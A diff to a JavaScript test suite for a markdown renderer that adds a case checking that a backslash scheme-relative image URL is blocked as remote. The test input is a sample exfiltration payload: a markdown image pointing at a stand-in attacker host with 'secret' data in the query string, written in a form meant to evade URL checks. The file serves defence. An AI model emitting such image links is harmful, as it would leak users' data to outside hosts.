@@ -363,6 +363,14 @@ describe('remote images', () => {
     expect(div.querySelector('.remote-image-placeholder')).toBeNull();
   });
 
+  it('treats a backslash scheme-relative URL as remote', () => {
+    // Browsers read `\\attacker.example/x.png` as `//attacker.example/x.png`.
+    const div = parse('![chart](\\\\attacker.example/p.png?d=secret)');
+
+    expect(div.querySelector('img')).toBeNull();
+    expect(div.querySelector('button.remote-image-placeholder')).not.toBeNull();
+  });
+
   it('renders same-origin images directly', () => {
     const src = '/api/v2/conversations/abc/files/chart.png';
     const div = parse(`![chart](${src})`);
